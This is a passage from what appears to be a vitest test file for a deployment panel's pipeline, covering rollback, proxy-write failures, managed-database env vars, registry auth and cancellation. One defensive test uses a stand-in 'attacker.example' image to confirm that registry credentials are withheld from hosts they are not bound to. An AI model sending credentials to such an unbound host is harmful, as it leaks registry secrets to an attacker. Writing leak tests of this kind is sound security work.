    await runDeployment(db as never, 1);

    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate?.values).toMatchObject({ runtimeId: 'n8n-1', port: 5678 });
  });

  it('resolves creds from the source row and persists the checked-out sha', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.deployments.findFirst.mockResolvedValue({ ...dep, commitSha: 'pin-sha' });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7,
      type: 'github',
      tokenEncrypted: 'tok',
      deployKeyEncrypted: 'key',
    });
    h.checkoutCommit.mockResolvedValue('resolved-sha');

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledWith(
      'https://github.com/a/b.git',
      'main',
      'pin-sha',
      path.join(reposDir, '5'),
      expect.any(Function),
      { type: 'github', token: 'dec:tok', deployKey: 'dec:key' },
    );
    const shaUpdate = updates.find((u) => u.table === deployments && u.values.commitSha === 'resolved-sha');
    expect(shaUpdate).toBeDefined();
  });

  it('builds creds with undefined token/deployKey when the source has none and defaults the repoUrl', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7, repoUrl: null });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7,
      type: 'custom',
      tokenEncrypted: null,
      deployKeyEncrypted: null,
    });

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledWith(
      '',
      'main',
      undefined,
      path.join(reposDir, '5'),
      expect.any(Function),
      { type: 'custom', token: undefined, deployKey: undefined },
    );
  });

  it('calls checkoutCommit without creds when the source row is missing', async () => {
    const { db } = makeDb();
    baseSetup(db, { sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue(undefined);

    await runDeployment(db as never, 1);

    expect(db.query.sources.findFirst).toHaveBeenCalled();
    expect(h.checkoutCommit).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(String),
      undefined,
      expect.any(String),
      expect.any(Function),
      undefined,
    );
  });

  it('calls checkoutCommit without querying sources when sourceId is absent', async () => {
    const { db } = makeDb();
    baseSetup(db);

    await runDeployment(db as never, 1);

    expect(db.query.sources.findFirst).not.toHaveBeenCalled();
    expect(h.checkoutCommit).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(String),
      undefined,
      expect.any(String),
      expect.any(Function),
      undefined,
    );
  });

  it('passes the previous runtime when the service was already running', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, healthPath: '/health' });

    await runDeployment(db as never, 1);

    const [, previous] = h.builder.buildAndRun.mock.calls[0] as [unknown, unknown];
    expect(previous).toEqual({ runtimeId: 'old-c', port: 8080, healthPath: '/health' });
  });

  it('normalises a null port and healthPath in the previous runtime', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: null, healthPath: null });

    await runDeployment(db as never, 1);

    const [, previous] = h.builder.buildAndRun.mock.calls[0] as [unknown, unknown];
    expect(previous).toEqual({ runtimeId: 'old-c', port: null, healthPath: '/' });
  });

  it('stops the previous runtime after a successful blue-green deploy (finalize)', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✓ Deployment successful');
    // Routing flipped to the new container first, a grace period let Traefik
    // reload, and only then was the old container stopped.
    expect(h.writeDynamicConfig).toHaveBeenCalledWith(db);
    expect(sleepMock.sleep).toHaveBeenCalledWith(2000);
    expect(h.builder.stop).toHaveBeenCalledWith('old-c', { graceSeconds: undefined });
  });

  it('r398: a proxy-write failure after two attempts fails the deploy and reverts to the previous runtime', async () => {
    // The old behavior swallowed the error and finalized GREEN: the service
    // row pointed at an unrouted new container while Traefik kept serving the
    // previous generation — traffic, log and panel disagreed.
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, commitSha: 'oldsha1' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.writeDynamicConfig.mockRejectedValue(new Error('ENOSPC: no space left on device'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // One retry before giving up.
    expect(h.writeDynamicConfig).toHaveBeenCalledTimes(2);
    // The deployment is recorded failed, not green.
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    // The service row points back at the still-routed previous runtime.
    const revert = updates.find((u) => u.table === services && u.values.runtimeId === 'old-c');
    expect(revert?.values).toMatchObject({ status: 'running', port: 8080, commitSha: 'oldsha1' });
    // The unrouted new container is retired; the previous one is NOT.
    expect(h.builder.stop).toHaveBeenCalledWith('c-2');
    expect(h.builder.stop).not.toHaveBeenCalledWith('old-c', expect.anything());
    expect(lines.some((l) => l.includes('Reverting to the previous runtime'))).toBe(true);
    expect(lines).not.toContain('✓ Deployment successful');
  });

  it('r398: a transient proxy-write failure is rescued by the second attempt', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.writeDynamicConfig.mockRejectedValueOnce(new Error('transient')).mockResolvedValueOnce(undefined);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.writeDynamicConfig).toHaveBeenCalledTimes(2);
    expect(lines).toContain('✓ Deployment successful');
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(false);
  });

  it('r398: a first-ever deploy whose proxy write fails marks the service errored and stops the container', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: null });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-9', port: 3000, healthPath: '/' });
    h.writeDynamicConfig.mockRejectedValue(new Error('EACCES'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(updates.some((u) => u.table === services && u.values.status === 'error' && u.values.runtimeId === null)).toBe(true);
    expect(h.builder.stop).toHaveBeenCalledWith('c-9');
    expect(lines).not.toContain('✓ Deployment successful');
  });

  it('rolls back to the previous runtime when the new one fails healthcheck (blue-green)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c', port: 8080, healthPath: '/health' });
    // New runtime unhealthy, but the previous is still alive.
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 8080, healthPath: '/health' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(true);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('↩ Previous runtime is still healthy — rolled back to it.');
    expect(h.builder.stop).toHaveBeenCalledWith('c-2'); // failed new runtime cleaned up
    expect(updates.some((u) => u.table === services && u.values.status === 'running')).toBe(true);
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(false);
  });

  it('marks the service errored when the previous runtime is gone (PM2-style failure)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    // New unhealthy AND the previous is no longer alive.
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(false);

    await runDeployment(db as never, 1);

    expect(h.builder.stop).toHaveBeenCalledWith('c-2');
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'running')).toBe(false);
  });

  it('r167: a failed deploy keeps the row pointing at a previous runtime it cannot prove healthy', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(false);

    await runDeployment(db as never, 1);

    const errored = updates.find((u) => u.table === services && u.values.status === 'error');
    expect(errored?.values.runtimeId).toBe('old-c');
  });

  it('r167: an in-place (compose) redeploy that fails never stops the only stack', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'stack-1' });
    // Compose redeploys in place: the "new" runtime has the previous id.
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'stack-1', port: 3000, healthPath: '/' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockResolvedValueOnce(false);

    await runDeployment(db as never, 1);

    expect(h.builder.stop).not.toHaveBeenCalledWith('stack-1');
  });

  it('treats a previous-runtime probe error as not restorable', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.builder.isHealthy.mockResolvedValueOnce(false).mockRejectedValueOnce(new Error('probe boom'));

    await runDeployment(db as never, 1);

    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
  });

  it('does not throw when safeFail cannot persist the failure status', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue(new Error('build boom'));
    // Make only the failure-status writes inside safeFail reject. The object
    // must stay awaitable (`where()` is awaited directly elsewhere) while also
    // carrying the .returning() the conditional claim write chains (r404).
    db.update = vi.fn(() => ({
      set: (values: Record<string, unknown>) => {
        const failWrite = values.status === 'failed' || values.status === 'error';
        return {
          where: () => ({
            returning: () => (failWrite ? Promise.reject(new Error('db locked')) : Promise.resolve([{ id: 1 }])),
            // biome-ignore lint/suspicious/noThenProperty: intentional thenable — mirrors the chained query builders.
            then: (ok: (v: unknown) => unknown, rej?: (e: Error) => unknown) =>
              (failWrite ? Promise.reject(new Error('db locked')) : Promise.resolve(undefined)).then(ok, rej),
          }),
        };
      },
    }));
    const lines = collectLogs(1);

    await expect(runDeployment(db as never, 1)).resolves.toBeUndefined();
    expect(lines).toContain('failed to mark deployment failed: db locked');
    expect(lines).toContain('failed to mark service errored: db locked');
  });

  it('logs a finalize warning and still succeeds when stopping the previous runtime fails', async () => {
    const { db } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' });
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.builder.stop.mockRejectedValue(new Error('docker down'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('finalize warning (previous stop): docker down');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('logs a wildcard-domain warning and still succeeds when the insert fails', async () => {
    const { db } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    db.insert = vi.fn(() => ({ values: () => Promise.reject(new Error('unique constraint')) }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('warning: could not auto-assign wildcard domain: unique constraint');
    expect(lines).toContain('✓ Deployment successful');
  });

  it('auto-provisions a wildcard domain when configured and missing', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // Scoped to `domains`: the pipeline also writes the deploy OUTCOME to the
    // audit log now, so a bare insert count would conflate the two.
    const domainInserts = inserts.filter((i: { table: unknown }) => i.table === domains);
    expect(domainInserts).toHaveLength(1);
    expect(domainInserts[0]!.values).toEqual({
      serviceId: 5,
      hostname: 'web.example.com',
      path: '/',
      ssl: false,
      status: 'active',
    });
    expect(lines).toContain('🌐 Auto-assigned URL: http://web.example.com');
  });

  it('enables HTTPS for auto-provisioned wildcard domains when ACME is configured', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    h.getAcmeEmail.mockResolvedValueOnce('ops@example.com');
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue(undefined);
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(inserts.filter((i: { table: unknown }) => i.table === domains)[0]!.values).toMatchObject({ hostname: 'web.example.com', ssl: true });
    expect(lines).toContain('🌐 Auto-assigned URL: https://web.example.com');
  });

  it('does not duplicate an existing wildcard domain', async () => {
    const { db, inserts } = makeDb();
    h.config.wildcardDomain = 'example.com';
    baseSetup(db);
    db.query.domains.findFirst.mockResolvedValue({ id: 1 });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(inserts.filter((i: { table: unknown }) => i.table === domains)).toHaveLength(0);
    expect(lines.some((line) => line.includes('Auto-assigned URL:'))).toBe(false);
  });

  it('r398: names the proxy failure in the log (Error) and fails the deploy — no green finalize', async () => {
    // The write fails on BOTH attempts (r398 retries once). The old contract
    // ("warning + still succeeds") was the bug: the panel showed green while
    // Traefik kept routing to the previous generation.
    const { db, updates } = makeDb();
    baseSetup(db);
    h.writeDynamicConfig.mockRejectedValue(new Error('disk full'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.includes('disk full'))).toBe(true);
    expect(lines).not.toContain('✓ Deployment successful');
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
  });

  it('r398: stringifies a non-Error proxy failure and fails the deploy', async () => {
    const { db, updates } = makeDb();
    baseSetup(db);
    h.writeDynamicConfig.mockRejectedValue('disk full');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.some((l) => l.includes('disk full'))).toBe(true);
    expect(lines).not.toContain('✓ Deployment successful');
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
  });

  it('r398: keeps the previous container SERVING when the routing flip fails (revert, not outage)', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { runtimeId: 'old-c' }); // a previous container is serving
    h.builder.buildAndRun.mockResolvedValue({ runtimeId: 'c-2', port: 3000, healthPath: '/' });
    h.writeDynamicConfig.mockRejectedValue(new Error('disk full'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    // Routing did not flip → the previous container keeps serving, the new
    // unrouted one is retired, and the deployment is recorded failed.
    expect(h.builder.stop).not.toHaveBeenCalledWith('old-c');
    expect(h.builder.stop).toHaveBeenCalledWith('c-2');
    expect(updates.some((u) => u.table === services && u.values.runtimeId === 'old-c' && u.values.status === 'running')).toBe(true);
    expect(lines.some((l) => l.includes('Reverting to the previous runtime'))).toBe(true);
  });

  it('fails the deployment with a stringified reason when the failure is not an Error', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue('build boom');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: build boom');
    expect(h.builder.stop).not.toHaveBeenCalled();
  });

  it('fails the deployment when the healthcheck never passes', async () => {
    const { db, updates } = makeDb();
    baseSetup(db);
    h.builder.isHealthy.mockResolvedValue(false);
    h.builder.stop.mockRejectedValue(new Error('cannot stop'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: Healthcheck failed — service did not become ready in time');
    expect(h.builder.stop).toHaveBeenCalledWith('c-1');
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
    expect(updates.some((u) => u.table === services && u.values.status === 'error')).toBe(true);
    expect(updates.some((u) => u.values.status === 'running')).toBe(false);
  });

  it('fails the deployment when buildAndRun throws, without stopping', async () => {
    const { db, updates } = makeDb();
    baseSetup(db);
    h.builder.buildAndRun.mockRejectedValue(new Error('build boom'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: build boom');
    expect(h.builder.stop).not.toHaveBeenCalled();
    expect(updates.some((u) => u.table === deployments && u.values.status === 'failed')).toBe(true);
  });

  it('fails the deployment when the git checkout throws', async () => {
    const { db } = makeDb();
    baseSetup(db);
    h.checkoutCommit.mockRejectedValue(new Error('auth failed'));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines).toContain('✗ Deployment failed: auth failed');
    expect(h.builder.stop).not.toHaveBeenCalled();
  });

  it('loads env vars and connection strings from attached running databases', async () => {
    const { db } = makeDb();
    baseSetup(db);
    db.query.envVars.findMany.mockResolvedValue([
      { id: 1, key: 'FOO', valueEncrypted: 'e1' },
      { id: 2, key: 'BAR', valueEncrypted: 'e2' },
    ]);
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'DB_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValueOnce({ id: 10, status: 'running' });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.env).toEqual({ FOO: 'dec:e1', BAR: 'dec:e2', DB_URL: 'postgres://db/app' });
    expect(h.connectionString).toHaveBeenCalledTimes(1);
    expect(h.connectionString).toHaveBeenCalledWith(expect.objectContaining({ id: 10 }));
    expect(h.decrypt).toHaveBeenCalledWith('e1');
  });

  it('reconciles durable Hub dependencies before loading runtime environment', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'wordpress:latest', templateId: 'wordpress' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    h.reconcileTemplateDependencies.mockResolvedValueOnce({
      database: { slug: 'wordpress-db' },
      alreadyAttached: false,
    });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.reconcileTemplateDependencies).toHaveBeenCalledWith(db, expect.objectContaining({ templateId: 'wordpress' }), expect.any(Function));
    expect(lines).toContain('##[stage:DEPENDENCIES:running] Reconciling managed template dependencies');
    expect(lines).toContain('Managed database wordpress-db is running and attached');
    expect(lines).toContain('##[stage:DEPENDENCIES:success]');

    h.reconcileTemplateDependencies.mockResolvedValueOnce(null);
    await runDeployment(db as never, 1);
  });

  it('maps managed database fields to application-specific template env vars', async () => {
    const { db } = makeDb();
    baseSetup(db, {
      templateDatabaseEnv: {
        WORDPRESS_DB_HOST: 'hostPort',
        WORDPRESS_DB_USER: 'username',
        WORDPRESS_DB_PASSWORD: 'password',
        WORDPRESS_DB_NAME: 'database',
      },
    });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'MYSQL_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({
      id: 10,
      engine: 'mysql',
      status: 'running',
      internalHost: 'nd-db-wordpress',
      internalPort: 3306,
      username: 'root',
      passwordEncrypted: 'db-secret',
      dbName: 'app',
    });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [{ env: Record<string, string> }];
    expect(ctx.env).toMatchObject({
      WORDPRESS_DB_HOST: 'nd-db-wordpress:3306',
      WORDPRESS_DB_USER: 'root',
      WORDPRESS_DB_PASSWORD: ['dec', 'db-secret'].join(':'),
      WORDPRESS_DB_NAME: 'app',
    });
    expect(ctx.env).not.toHaveProperty('MYSQL_URL');
  });

  it('recovers a missing Ghost mapping from the trusted bundled runtime contract', async () => {
    const { db } = makeDb();
    baseSetup(db, {
      image: 'ghost:5-alpine',
      port: 2368,
      volumeMount: '/var/lib/ghost/content',
      templateDatabaseEnv: { DATABASE_URL: 'url' },
    });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'DATABASE_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({
      id: 10,
      engine: 'mysql',
      status: 'running',
      containerName: 'nd-db-ghost-db',
      internalHost: 'nd-db-ghost-db',
      internalPort: 3306,
      username: 'root',
      passwordEncrypted: 'ghost-db-secret',
      dbName: 'app',
    });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [{ env: Record<string, string> }];
    expect(ctx.env).toMatchObject({
      database__connection__host: 'nd-db-ghost-db',
      database__connection__port: '3306',
      database__connection__user: 'root',
      database__connection__password: ['dec', 'ghost-db-secret'].join(':'),
      database__connection__database: 'app',
    });
    expect(ctx.env).not.toHaveProperty('DATABASE_URL');
    expect(lines).toContain(
      'Managed database environment ready: database__connection__database, database__connection__host, database__connection__password, database__connection__port, database__connection__user',
    );
  });

  it('fails before container startup when an attached database is not running', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'ghost:5-alpine' });
    db.query.databaseAttachments.findMany.mockResolvedValue([
      { id: 1, databaseId: 10, envAlias: 'DATABASE_URL' },
    ]);
    db.query.databases.findFirst.mockResolvedValue({ id: 10, engine: 'mysql', status: 'error' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines).toContain('✗ Deployment failed: Managed database dependency is not ready (0/1 attachments running)');
  });

  // ── private-registry auth ────────────────────────────────────────────────
  it('resolves registry auth from a registry-type source for image deploys', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'ghcr.io/acme/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7, type: 'registry', registryUsername: 'ci', tokenEncrypted: 'tok-enc',
    });

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toEqual({ username: 'ci', password: 'dec:tok-enc', server: 'ghcr.io' });
  });

  it('r512: withholds a registry credential from a host it is not bound to (fan-out shares the resolver)', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'attacker.example/x:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7, type: 'registry', name: 'ghcr-ci', registryUsername: 'ci', tokenEncrypted: 'tok-enc',
    });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
    expect(lines.some((l) => l.includes('registry credential "ghcr-ci"') && l.includes('not sending it to attacker.example'))).toBe(true);
  });

  it('derives no server for bare image names and skips incomplete credentials', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({
      id: 7, type: 'registry', registryUsername: 'ci', tokenEncrypted: null,
    });
    await runDeployment(db as never, 1);
    let [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    // A non-registry source and a missing source row behave the same.
    h.builder.buildAndRun.mockClear();
    db.query.sources.findFirst.mockResolvedValue({ id: 8, type: 'github', registryUsername: 'ci', tokenEncrypted: 'x' });
    await runDeployment(db as never, 1);
    [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    h.builder.buildAndRun.mockClear();
    db.query.sources.findFirst.mockResolvedValue(undefined);
    await runDeployment(db as never, 1);
    [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
  });

  it('skips registry auth for repo deploys even with a registry source', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: null, sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();
  });

  it('hands the builder no agent seam — remote deploys are refused, not routed', async () => {
    // This used to assert that `agentCall` was bound for a remote service,
    // which read as "remote deploys work". Nothing ever consumed the binding,
    // so the deploy ran on the panel host; the pipeline now refuses it
    // outright (see "runDeployment refuses a remote-server target") and the
    // seam is re-bound by whichever change teaches a builder to use it.
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', serverId: null });
    h.builder.buildAndRun.mockClear();

    await runDeployment(db as never, 1);

    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.agentCall).toBeUndefined();
    expect(ctx.serverId).toBeUndefined();
    expect(h.agentOp).not.toHaveBeenCalled();
  });

  it('detects registry hosts with a port and skips Docker Hub names', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'registry.local:5000/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toMatchObject({ server: 'registry.local:5000' });

    // org/app (no dot in the first segment) → no server, Docker Hub default.
    h.builder.buildAndRun.mockClear();
    baseSetup(db, { image: 'acme/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx2] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx2.registryAuth).toMatchObject({ server: undefined });
  });

  it('covers null registryUsername and port-style bare image names', async () => {
    const { db } = makeDb();
    // registryUsername null → username '' → auth skipped (incomplete).
    baseSetup(db, { image: 'reg.io/app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: null, tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx.registryAuth).toBeUndefined();

    // A bare name with a single segment: split('/')[0] is the whole name.
    h.builder.buildAndRun.mockClear();
    baseSetup(db, { image: 'app:1', sourceId: 7 });
    db.query.sources.findFirst.mockResolvedValue({ id: 7, type: 'registry', registryUsername: 'u', tokenEncrypted: 't' });
    await runDeployment(db as never, 1);
    const [ctx2] = h.builder.buildAndRun.mock.calls[0] as [Record<string, unknown>];
    expect(ctx2.registryAuth).toMatchObject({ server: undefined });
  });

  // ── cancellation ─────────────────────────────────────────────────────────
  it('aborts before the build when the deployment was cancelled mid-flight', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    // First read: the pipeline's initial fetch. Subsequent reads (checkpoints)
    // observe the cancel route's write.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    // No previous runtime → the service is idle, the deployment cancelled.
    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'idle');
    expect(svcUpdate).toBeTruthy();
    const depUpdate = updates.find((u) => u.table === deployments && u.values.status === 'cancelled');
    expect(depUpdate?.values.finishedAt).toBeInstanceOf(Date);
  });

  it('cancelling with a healthy previous runtime keeps the old version serving', async () => {
    const { db, updates } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    // Reads: 1 = initial fetch, 2 = pre-build checkpoint, 3 = post-checkout
    // checkpoint (still in-flight); 4+ = the cancel is visible post-build.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    h.builder.isHealthy.mockImplementation(async (runtime: { runtimeId: string }) => runtime.runtimeId === 'old-c');
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
    expect(lines.join('\n')).toContain('↩ Previous runtime is still healthy — rolled back to it.');
    // The new runtime was retired, the service stays running.
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
    const svcUpdate = updates.find((u) => u.table === services && u.values.status === 'running');
    expect(svcUpdate).toBeTruthy();
  });

  it('a cancel landing just before the finalize write retires the new container', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest', runtimeId: 'old-c' });
    db.query.deployments.findFirst.mockResolvedValue(dep);
    // …but the conditional finalize update (status running + imageDigest set)
    // returns no rows — as if the cancel flipped the row between checkpoint and write.
    const dbAny = db as unknown as {
      update: (t: unknown) => { set: (v: Record<string, unknown>) => { where: () => { returning: () => Promise<unknown[]> } } };
    };
    const origUpdate = dbAny.update.bind(dbAny);
    dbAny.update = ((table: unknown) => {
      const builder = origUpdate(table);
      return {
        set: (values: Record<string, unknown>) => {
          const inner = builder.set(values);
          if (values.status === 'running' && 'imageDigest' in values) {
            return { where: () => ({ returning: () => Promise.resolve([]) }) };
          }
          return inner;
        },
      };
    }) as typeof dbAny.update;
    h.builder.buildAndRun.mockImplementation(async () => ({ runtimeId: 'new-c', port: 3000, healthPath: '/' }));
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    const text = lines.join('\n');
    expect(text).toContain('Cancelled just before finalizing');
    expect(h.builder.stop).toHaveBeenCalledWith('new-c');
  });

  it('cancels a repo deploy at the post-checkout checkpoint', async () => {
    const { db } = makeDb();
    baseSetup(db, { repoUrl: 'https://github.com/a/b.git' });
    // Reads: 1 = initial, 2 = pre-build checkpoint; 3 = post-checkout → cancelled.
    db.query.deployments.findFirst
      .mockResolvedValueOnce(dep)
      .mockResolvedValueOnce(dep)
      .mockResolvedValue({ ...dep, status: 'cancelled' });
    const lines = collectLogs(1);

    await runDeployment(db as never, 1);

    expect(h.checkoutCommit).toHaveBeenCalledTimes(1);
    expect(h.builder.buildAndRun).not.toHaveBeenCalled();
    expect(lines.join('\n')).toContain('⏹ Deployment cancelled');
  });

  it('cancels after a passing healthcheck, just before the success writes', async () => {
    const { db } = makeDb();
    baseSetup(db, { image: 'nginx:latest' });
    // Reads: 1 initial, 2 pre-build, 3 post-checkout, 4 post-build; 5 = final checkpoint.
